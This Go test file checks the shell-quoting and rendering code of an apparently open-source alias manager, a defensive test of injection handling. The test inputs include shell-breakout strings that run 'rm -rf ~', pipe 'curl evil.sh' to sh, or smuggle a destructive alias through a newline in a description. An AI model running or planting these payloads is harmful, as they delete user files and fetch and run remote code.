package renderers

import (
	"strings"
	"testing"

	"github.com/angeltonio/aliasdeck/internal/domain"
)

func TestQuotePOSIX(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "plain command needs only wrapping",
			in:   "docker ps",
			want: `'docker ps'`,
		},
		{
			name: "double quotes are literal inside single quotes",
			in:   `echo "hello world"`,
			want: `'echo "hello world"'`,
		},
		{
			name: "single quote is closed, escaped and reopened",
			in:   "don't",
			want: `'don'\''t'`,
		},
		{
			name: "variables are not expanded at generation time",
			in:   "cd $HOME && ls",
			want: `'cd $HOME && ls'`,
		},
		{
			name: "command substitution stays literal",
			in:   "echo $(date) `hostname`",
			want: "'echo $(date) `hostname`'",
		},
		{
			name: "backslashes are literal",
			in:   `grep -E '\d+'`,
			want: `'grep -E '\''\d+'\'''`,
		},
		{
			name: "empty string still produces a quoted empty literal",
			in:   "",
			want: `''`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := quotePOSIX(tt.in); got != tt.want {
				t.Errorf("quotePOSIX(%q)\n got: %s\nwant: %s", tt.in, got, tt.want)
			}
		})
	}
}

// TestQuotePOSIXNeutralizesBreakout is the test this whole package exists for.
//
// A command crafted to terminate its own alias definition and start a second
// statement must end up as one inert string. If this test ever fails, AliasDeck
// is a remote code execution vector, not an alias manager.
func TestQuotePOSIXNeutralizesBreakout(t *testing.T) {
	attacks := []string{
		`x'; rm -rf ~; alias y='z`,
		`x' && curl evil.sh | sh && echo '`,
		`'; echo pwned; '`,
	}

	for _, attack := range attacks {
		quoted := quotePOSIX(attack)

		// Every single quote in the output must be part of the closing/escaping
		// dance, never a bare quote that lets the shell resume parsing code.
		// Stripping the escape sequence must leave exactly the two delimiters.
		stripped := strings.ReplaceAll(quoted, `'\''`, "")
		if got := strings.Count(stripped, "'"); got != 2 {
			t.Errorf("quotePOSIX(%q) = %s\nleaves %d unescaped quotes, want exactly 2 delimiters",
				attack, quoted, got)
		}
		if !strings.HasPrefix(quoted, "'") || !strings.HasSuffix(quoted, "'") {
			t.Errorf("quotePOSIX(%q) = %s: not wrapped in single quotes", attack, quoted)
		}
	}
}

func TestRenderIsDeterministic(t *testing.T) {
	cfg := fixture()

	first, err := Render(cfg)
	if err != nil {
		t.Fatalf("Render: %v", err)
	}

	// Same input, different alias ordering: output must be byte-identical,
	// because sync decides whether to write by comparing hashes.
	shuffled := fixture()
	shuffled.Aliases[0], shuffled.Aliases[2] = shuffled.Aliases[2], shuffled.Aliases[0]

	second, err := Render(shuffled)
	if err != nil {
		t.Fatalf("Render (shuffled): %v", err)
	}

	if first != second {
		t.Errorf("render is not deterministic across input ordering:\n--- first ---\n%s\n--- second ---\n%s",
			first, second)
	}
}

func TestRenderRejectsInvalidConfig(t *testing.T) {
	cfg := fixture()
	cfg.Aliases = append(cfg.Aliases, domain.Alias{
		Name:    "if",
		Command: "echo nope",
		Enabled: true,
	})

	if _, err := Render(cfg); err == nil {
		t.Fatal("Render accepted a reserved-word alias name; the guard is not running")
	}
}

func TestRenderRejectsCommentInjection(t *testing.T) {
	cfg := fixture()
	cfg.Aliases = []domain.Alias{{
		Name:        "safe",
		Command:     "echo hi",
		Description: "harmless\nalias evil='rm -rf ~'",
		Enabled:     true,
	}}

	if _, err := Render(cfg); err == nil {
		t.Fatal("Render accepted a description containing a newline; comment injection is possible")
	}
}

func TestForUnsupportedShell(t *testing.T) {
	if _, err := For(domain.ShellPowerShell); err == nil {
		t.Fatal("expected PowerShell to be unsupported in this milestone")
	}
	if _, err := For(domain.Shell("fish")); err == nil {
		t.Fatal("expected an unknown shell to be unsupported")
	}
}

func TestSupported(t *testing.T) {
	got := Supported()
	want := []domain.Shell{domain.ShellZsh, domain.ShellBash}

	if len(got) != len(want) {
		t.Fatalf("Supported() = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("Supported() = %v, want %v", got, want)
		}
	}
}

// fixture returns a small but representative configuration: a described alias,
// a bare one, and one whose command contains a quote.
func fixture() domain.ResolvedConfig {
	dev := domain.Device{
		ID:         "dev-1",
		Name:       "macbook",
		Platform:   domain.PlatformMacOS,
		Shell:      domain.ShellZsh,
		ProfileIDs: []string{"development", "homelab"},
	}

	aliases := []domain.Alias{
		{
			Name:        "dcu",
			Command:     "docker compose up -d",
			Description: "Start the Compose stack",
			Enabled:     true,
		},
		{
			Name:    "dps",
			Command: "docker ps",
			Enabled: true,
		},
		{
			Name:        "gwip",
			Command:     `git commit -m 'wip'`,
			Description: "Quick work-in-progress commit",
			Enabled:     true,
		},
	}

	cfg := domain.ResolvedConfig{Device: dev, Aliases: aliases}
	cfg.Revision = cfg.ComputeRevision()
	return cfg
}
